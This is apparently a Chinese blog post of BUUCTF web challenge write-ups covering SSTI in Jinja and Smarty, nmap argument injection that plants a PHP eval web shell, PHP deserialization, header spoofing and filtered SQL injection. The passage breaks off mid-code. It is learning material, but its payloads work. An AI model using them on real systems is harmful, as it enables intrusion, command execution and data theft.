data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p bf6bdd15-e59a-48d0-9214-7dce61cd0e86>拿到 flag，flag</p><h2 id="mrctf2020pywebsite"><a class="markdownIt-Anchor" href="#mrctf2020pywebsite">#</a> [MRCTF2020]PYWebsite</h2><p>本题进去之后就是各种写着付款，穷学生没钱付款，Buy It Now 还真有个二维码，不过这个二维码不是付款，而是提示我们好好分析代码，查看网页源代码</p><p>这里存在一个判断，如果相等就回显 <code>flag.php</code></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a5.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试能不能直接访问 <code>flag.php</code></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a6.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>嗯？哈哈哈。保存了购买者的 IP，除了购买者和我自己看得了，那就是没有保存自己的 IP，通过本地访问？尝试 XFF 伪造本地 IP</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a7.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 41329ffd-a5f6-49c2-aec9-cf4543a3d109>下面两行空白的不能少，得到 flag，flag</p><h2 id="westernctf2018shrine"><a class="markdownIt-Anchor" href="#westernctf2018shrine">#</a> [WesternCTF2018]shrine</h2><p>题目给了源码</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a8.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>本题涉及的是 SSTI 注入，在源代码中有 一个 <code>safe_jinjia</code> ，就知道这是 jinjia 模板引擎，有哪些引擎啥的可以去 buu 刷题 3 找找我记得是写在那边的</p><p>分析源码可以看到本题有两个路由，第一个是 <code>@app.route('/')</code> ，显示源代码，第二个是 <code>@app.route('/shrine/&lt;path:shrine&gt;')</code> ，要在 <code>/shrine/</code>  路径下提交参数，同时有个黑名单，过滤了 config 和 self。</p><p>如果没有黑名单的时候，我们可以使用 <code>config</code> ，传入  <code>config</code> ，或者使用 <code>self</code> ，传入  <code>&#123;&#123;self.__dict__&#125;&#125;</code></p><p>当 <code>config</code> , <code>self</code> , <code>()</code>  都被过滤的时候，为了获取讯息，我们需要读取一些例如 <code>current_app</code>  这样的全局变量。</p><p>这道题还用上了 python 的沙箱逃逸的方法，又是一个陌生的知识点。。。 <code>利用python对象之间的引用关系来调用被禁用的函数对象</code> ，留个我看的沙箱逃逸的链接：<a href="https://blog.csdn.net/calmegm/article/details/97390756">https://blog.csdn.net/calmegm/article/details/97390756</a></p><p>回到题目，先测试一下是否存在 SSTI 注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;2+5&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a9.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以看到存在 SSTI 注入，因为本题是 python 代码，就可以使用 python 自带的函数进行注入， <code>url_for</code>  构造 url，接受函数名作为第一个参数</p><blockquote><p>查了一下 url_for () 的作用：</p><p>如果我们在视图函数中想使用一个 url，比如给前端返回，或者我们在这个视图函数中返回一个模板文件都会使用到 url，url 相当于一把钥匙可以开启一些资源。如果你修改了注册路由编写的 url 规则，相当于修改了钥匙。那么其他的视图函数依旧是使用了原来的钥匙就无效了，如果项目是一个大项目，你一点点手动的去改涉及到的的 url 就不合理了。url_for () 就是用来解决这个问题的。</p></blockquote><p><code>get_flashed_message()</code>  是通过 <code>flash()</code>  传入闪现信息列表的，能够把字符串对象表示的信息加入到一个消息列表，然后通过调用 <code>get_flashed_message()</code>  来取出。</p><p>构造 payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a10.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><code>current_app</code>  是当前使用的 app，获取当前 app 的 config</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a11.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 382af01a-44eb-4f62-afc6-3895abbecc0f>得到 flag，flag</p><p>或者也可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>效果是一样的</p><p>对这种类型的题目还是很陌生，还需要沉淀，存在一个疑惑，就是函数内明明黑名单 config 了为什么这些 payload 的 config 没有被过滤？chatgpt 了一下，得到如下回答：</p><p>在这段代码中， <code>url_for.__globals__['current_app'].config</code>  这部分是一个完整的表达式，会被 Jinja 解释器解析为 Python 代码。然而，在你给出的  <code>safe_jinja</code>  函数中，并没有对这样的表达式进行解析或执行，因此黑名单并不会影响到它。</p><p><code>safe_jinja</code>  函数中的黑名单主要针对字符串  <code>s</code>  中直接出现的特定单词进行过滤，而不涉及表达式的解析。因此，如果直接在  <code>s</code>  中包含了  <code>'config'</code>  或  <code>'self'</code>  这样的字符串，它们会被替换成  <code>None</code> ，但如果在表达式中间嵌入了这些关键词，那么它们就不会受到影响。</p><p>大概能懂了！</p><h2 id="asis-2019unicorn-shop"><a class="markdownIt-Anchor" href="#asis-2019unicorn-shop">#</a> [ASIS 2019]Unicorn shop</h2><p>打开页面</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a11.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>随便输入一个 id 看看会是什么情况，输入 1</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a13.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>回显了这个，可以看到有一个函数对 price 做了一个操作，查询一下 <code>unicodedata.numeric()</code></p><p><code>unicodedata.numeric()</code>  函数是用来获取 Unicode 字符的数值属性的。Unicode 是一种用来表示文本字符的标准，每个字符都有一个唯一的数字编码。这个函数可以用来查找给定字符的数值属性，比如数字、小数、分数等。</p><p>那我们尝试购买吧，试了一下 1、2、3 都是不可以获得什么信息的</p><p>在尝试 4 的时候出现了提示，输入 ID4，Price1337，提示</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a14.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>only one char，只能一个字符，可以用 https://www.compart.com/en/unicode 查询一个 <code>unicodedata.numeric()</code>  之后比 1337 更大的数</p><p>直接查找 two thousand</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a15.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>复制其中的一个，我选的是第一个</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a16.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>尝试购买 id4</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a17.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p 78eb675d-c23f-458f-a1c5-062d9d6d53f5>购买成功，得到 flag，flag</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a18.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a18.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="网鼎杯-2020-朱雀组nmap"><a class="markdownIt-Anchor" href="#网鼎杯-2020-朱雀组nmap">#</a> [网鼎杯 2020 朱雀组] Nmap</h2><p>输入 127.0.0.1 看看先</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a19.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a19.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>其中 to list 回显了路径，那就想到一句话木马</p><p>题目提到 nmap 就想到 - oG，之前做过一题也是 nmap 的 [BUUCTF 2018] Online Tool，写在 buu 刷题 3 里了</p><p>这里尝试一下能不能使用 <code>|</code>  或者 <code>;</code></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a20.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a20.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>被转义了，用分号试试看</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a21.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a21.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>不行，之前有做过一道 nmap 的题目在 buuctf 刷题 3 Online Tool</p><p>把 payload 拿过来用一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a22.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a22.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>有过滤？试试修改一些关键字比如 php，把 php 改成 phtml 再试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a23.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>可以，没有过滤，那就加上地址扫描</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | &#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a24.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a24.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>看看 list 的路径</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a25.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a25.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>应该是和 list.php 一个路径下的，直接访问</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a26.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a26.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>蚁剑链接</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a27.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a27.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>最高一级目录找到 flag 文件</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a28.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a28.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><h2 id="npuctf2020readlezphp"><a class="markdownIt-Anchor" href="#npuctf2020readlezphp">#</a> [NPUCTF2020]ReadlezPHP</h2><p>f12 先查看源码</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a29.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a29.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>发现 <code>href=&quot;./time.php?source&quot;</code> ，存在 <code>time.php</code> ，访问看看</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a30.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a30.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]); </span><br></pre></td></tr></table></figure><p>审计一下代码，最关键的就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是构造成<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">b(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span></span></span></span>a) 形式的函数了，常见的就是 system () 形式</p><p>这里尝试 system 和 phpinfo 尝试获取一点信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125;</span><br></pre></td></tr></table></figure><p>但是没能回显 phpinfo，猜测一般遇到这种形式，system 都会被过滤，把 system 换成 assert 试试看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure><p>确实，在 phpinfo 看到 system 被禁用了</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a31.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a31.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a31"></p><p>可以在 phpinfo 里面直接找到 flag</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a32.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/a32.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="a32"></p><p 14ba67d3-8c19-4aaa-932b-b5329ed30979>flag</p><h2 id="ciscn2019-华东南赛区web11"><a class="markdownIt-Anchor" href="#ciscn2019-华东南赛区web11">#</a> [CISCN2019 华东南赛区] Web11</h2><p>网页最下面一行写着 <code>Build With Smarty !</code>  猜测存在 SSTI 注入，在哪里存在注入？先抓包看看</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b1.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b1.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>XFF？</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b2.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b2.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>找到注入点，另外提一嘴，Smarty 注入模板根据版本不一样</p><blockquote><p>1、 <code>&#123;php&#125;&#123;/php&#125;</code> :</p><p>Smarty 支持使用 {php}{/php} 标签来执行被包裹其中的 php 指令，最常规的思路自然是先测试该标签。</p><p><code>&#123;php&#125;phpinfo()&#123;/php&#125;</code></p><p>在 Smarty 3.1，{php} 仅在 SmartyBC 中可用。<br>2、{}</p><p>直接输入 php 命令，如： <code>&#123;system('ls')&#125;</code></p></blockquote><p>这里直接 <code>&#123;system(ls)&#125;</code></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b3.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><code>&#123;system('ls /')&#125;</code>  查看上一级目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;system(&#x27;ls /&#x27;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b3-17088778553313.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b3-17088778553313.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>cat flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;system(&#x27;cat /flag&#x27;)&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b4.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b4.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p d7f2944c-27cf-42da-a9fd-946771e3b39b>flag</p><h2 id="swpu2019web1"><a class="markdownIt-Anchor" href="#swpu2019web1">#</a> [SWPU2019]Web1</h2><p>先注册一个账号，登录后有两个链接一个是申请发布广告，另一个是注销登录，那就尝试申请发布广告</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b5.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b5.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b6.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b6.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>申请一个</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b7.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>广告详情</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b8.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>id？sql 注入？再申请一个广告看看</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b10.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="b10"></p><p>那可以看到第二个申请的广告 id 为 2，应该是根据 id 从数据库内提取出广告名、内容</p><p>这一题的注入点是在广告申请那边，尝试注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b11.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>回显 <code>标题含有敏感词汇</code> ，存在过滤，一般常见的过滤就是 <code>空格</code> 、 <code>order</code> 、 <code>#</code> 等等，确实看了别的师傅的 wp， <code>空格、or、#、--+、and</code>  都被过滤了。</p><p>修改一下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/group/**/by/**/1,&#x27;</span><br></pre></td></tr></table></figure><p>修改后成功，查看广告详情可以得到一些信息</p><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b12.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>继续测试看看由几个字段</p><p>直到第 23 个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/group/**/by/**/23,&#x27;</span><br></pre></td></tr></table></figure><p>出现 <code>Unknown column '23' in 'group statement'</code> ，所以可以知道总共有 22 个字段</p><p>unionselect 联合注入看看回显哪几个字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b13.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>回显字段为 2 和 3，那就获取当前数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b14.png" class="lazyload" data-srcset="/2024/02/25/buuctf%E5%88%B7%E9%A2%984/b14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>数据库为 <code>web1</code> ，获取表名，但是 information_schema 含有 or，or 被过滤，因此也无法使用。所以这里只能采用 innodb_index_stats 和 innodb_table_stats 来进行绕过。</p><p>爆表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 